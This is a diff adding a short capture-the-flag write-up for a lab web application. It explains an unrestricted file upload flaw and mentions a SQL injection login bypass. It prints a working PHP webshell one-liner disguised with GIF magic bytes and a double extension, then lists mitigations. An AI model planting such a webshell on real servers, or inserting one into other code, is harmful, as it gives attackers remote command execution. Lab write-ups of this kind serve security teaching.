@@ -1,0 +1,24 @@
+Challenge: agent_rfi 
+
+Vulnerability:
+Unrestricted File Upload combined with PHP code execution. The Settings page of the VIHS application
+allowed uploading a profile picture with only a weak content-type check. By prepending GIF magic bytes
+(GIF89a) to a PHP webshell, the extension check was bypassed and a .php file was uploaded and executed
+by the server.
+
+How I solved it:
+1. Logged into VIHS using SQL injection bypass.
+2. Created a PHP webshell with GIF magic bytes to bypass the image check:
+     GIF89a<?php system($_GET["cmd"]); ?>
+   Saved as shell.png.php
+3. Uploaded the file via Settings > Update Picture.
+   Server responded: "Agent RFI is successfully planted!"
+4. Navigated to Search tab, searched for "RFI", opened Agent RFI's profile.
+5. The flag was visible in Agent RFI's Bio section:
+  
+Mitigation:
+- Validate file type by checking magic bytes AND enforcing a whitelist of allowed extensions.
+- Store uploaded files outside the web root so they cannot be directly executed.
+- Rename uploaded files to random names without preserving the original extension.
+- Configure the web server to not execute scripts in the upload directory (e.g., php_flag engine off).
+- Implement Content Security Policy (CSP) headers.
